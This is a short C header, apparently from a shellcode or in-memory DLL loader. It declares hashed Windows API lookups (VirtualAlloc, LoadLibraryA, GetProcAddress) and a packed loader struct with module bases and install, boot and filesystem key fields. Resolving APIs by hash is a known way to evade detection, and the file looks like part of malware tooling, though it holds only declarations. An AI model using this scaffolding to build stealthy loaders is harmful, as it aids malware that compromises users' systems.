#ifndef __SHELLCODE_H_
#define __SHELLCODE_H_

#define VirtualAlloc_Hash 0x973F27BF
typedef void* (*FnVirtualAlloc)(void* lpAddress, size_t dwSize, uint32_t flAllocationType, uint32_t flProtect);

#define VirtualFree_Hash 0x785AFCB2
typedef int (*FnVirtualFree)(void* lpAddress, size_t dwSize, uint32_t dwFreeType);

#define LoadLibraryA_Hash 0xFA5F1697
typedef void* (*FnLoadLibraryA)(const char* lpFileName);

#define GetProcAddress_Hash 0xE98905D0
typedef void* (*FnGetProcAddress)(void* hModule, const char* lpProcName);

#pragma pack(push, 1)

typedef struct _dll_info
{
    uint32_t moduleBuffer;      // DLL base.
    size_t moduleSize;          // DLL size.
} dll_info_t, *pdll_info_t;

#ifdef _WIN64

typedef struct _dll64_info
{
    uint8_t* moduleBuffer;      // DLL base.
    size_t moduleSize;          // DLL size.
} dll64_info_t, *pdll64_info_t;

#endif // _WIN64

typedef struct _dll_block
{
    uint8_t* selfBase;
    uint8_t* ntdllBase;
    uint8_t* kernel32Base;
    FnLoadLibraryA fnLoadLibraryA;
    FnGetProcAddress fnGetProcAddress;
    FnVirtualAlloc fnVirtualAlloc;
    FnVirtualFree fnVirtualFree;
    uint8_t installKey[48];
    uint8_t bootKey[48];
    uint8_t fsKey[48];
    uint8_t clientId[16/*CLIENT_ID_SIZE*/];
} dll_block_t, *pdll_block_t;

#pragma pack(pop)

#endif // __SHELLCODE_H_
